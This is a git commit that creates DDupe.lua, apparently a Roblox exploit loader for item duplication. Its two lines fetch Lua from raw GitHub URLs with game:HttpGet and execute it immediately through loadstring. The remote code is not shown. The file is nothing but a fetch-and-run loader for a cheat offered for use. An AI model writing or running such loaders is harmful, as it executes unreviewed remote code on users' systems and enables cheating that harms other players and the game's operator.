67397a59188ee6e2fd7252902350692268061192
iwantsom3 <85751769+iwantsom3@users.noreply.github.com>
2025-04-07 18:45:47 +0900

    Create DDupe.lua

---
+++ DDupe.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PlsNoNoob/-/refs/heads/main/Dupe.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PlsNoNoob/-/refs/heads/main/No"))()
